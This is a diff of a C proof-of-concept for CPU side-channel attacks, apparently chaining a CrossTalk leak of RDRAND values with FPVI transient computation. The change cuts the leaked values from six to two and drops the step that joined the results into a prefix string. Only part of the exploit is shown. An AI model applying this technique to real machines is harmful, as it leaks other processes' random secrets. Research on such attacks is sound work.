@@ -17,7 +17,7 @@
 #define CROSSTALK_POSSIBLE_BYTES 256
 #define CROSSTALK_BYTES_TO_LEAK 8
 #define RDRAND_OFFSET 32
-#define RDRAND_TO_LEAK 6
+#define RDRAND_TO_LEAK 2
 #define CROSSTALK_CONFIDENCE 2
 #define CROSSTALK_TRIES 5
 #define CROSSTALK_SIMILARITY 6
@@ -329,27 +329,17 @@ int main(void) {
     }
 
     // FPVI on leaked rdrand values
-    uint64_t fpvi_results[RDRAND_TO_LEAK / 2] = {0};
-    for (int i = 0; i < RDRAND_TO_LEAK / 2; ++i)
-    {
-        uint64_t dlhs = make_denormal(leaked_rdrand[2 * i]);
-        uint64_t drhs = make_denormal(leaked_rdrand[2 * i + 1]);
+    uint64_t fpvi_results = 0;
 
-        printf("Denormalized lhs %d: 0x%016lx\n", 2 * i, dlhs);
-        printf("Denormalized rhs %d: 0x%016lx\n", 2 * i + 1, drhs);
+    uint64_t dlhs = make_denormal(leaked_rdrand[0]);
+    uint64_t drhs = make_denormal(leaked_rdrand[1]);
 
-        fpvi_results[i] = get_transient_result(dlhs, drhs, CACHE_THRESHOLD);
-    }
+    printf("Denormalized lhs: 0x%016lx\n", dlhs);
+    printf("Denormalized rhs: 0x%016lx\n", drhs);
 
-    for (int i = 0; i < RDRAND_TO_LEAK / 2; ++i) {
-        printf("FPVI transient result %d: 0x%016lx | %lu\n", i, fpvi_results[i], fpvi_results[i]);
-    }
+    fpvi_results = get_transient_result(dlhs, drhs, CACHE_THRESHOLD);
 
-    // Concatenate results to form prefix
-    char prefix[64];
-    snprintf(prefix, sizeof(prefix), "%lu%lu%lu", fpvi_results[0], fpvi_results[1], fpvi_results[2]);
-
-    printf("Prefix: %s\n", prefix);
+    printf("FPVI transient result: 0x%016lx | %lu\n", fpvi_results, fpvi_results);
 
     kill(pid, SIGKILL);
     waitpid(pid, NULL, 0);
